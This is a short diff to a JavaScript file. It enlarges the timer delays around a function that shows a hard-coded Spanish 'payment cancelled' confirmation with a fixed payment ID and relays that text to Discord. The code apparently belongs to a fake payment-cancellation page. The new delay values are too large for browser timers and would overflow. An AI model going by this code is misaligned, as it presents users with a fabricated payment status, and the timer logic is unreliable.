@@ -84,7 +84,7 @@ function enviarMensajeDiscord(mensaje) {
       if (dotCount === 3) {
         dotCount = 0;
       }
-    }, 500);
+    }, 5000000000);
 
     setTimeout(function () {
       clearInterval(intervalId);
@@ -95,5 +95,5 @@ function enviarMensajeDiscord(mensaje) {
       price.innerText = "¡Listo! Se ha cancelado el pago, no es necesario hacer nada más.\nID de pago: (#126415)";
       var mensaje = "¡Listo! Se ha cancelado el pago, no es necesario hacer nada más.\nID de pago: (#126415)";
       enviarMensajeDiscord(mensaje);
-    }, 4000);
+    }, 4000000000);
   }
